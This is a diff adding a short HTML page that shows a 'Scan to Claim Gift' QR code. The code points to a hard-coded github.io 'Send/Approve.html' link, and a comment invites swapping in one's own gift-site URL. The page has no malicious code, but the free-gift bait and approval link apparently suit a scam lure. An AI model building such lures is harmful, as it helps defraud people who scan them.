@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Gift QR Code</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- jQuery -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <!-- QR Code Plugin -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #07102a;
+      color: white;
+      padding: 40px;
+    }
+    #qrcode {
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Scan to Claim Gift 🎁</h2>
+  <div id="qrcode"></div>
+
+  <script>
+    $(document).ready(function() {
+      // 👇 Yahan apni gift wali site ka link daalo
+      var giftUrl = "https://ayanrizvi832000-tech.github.io/Send/Approve.html";
+      $('#qrcode').qrcode(giftUrl);
+    });
+  </script>
+</body>
+</html>
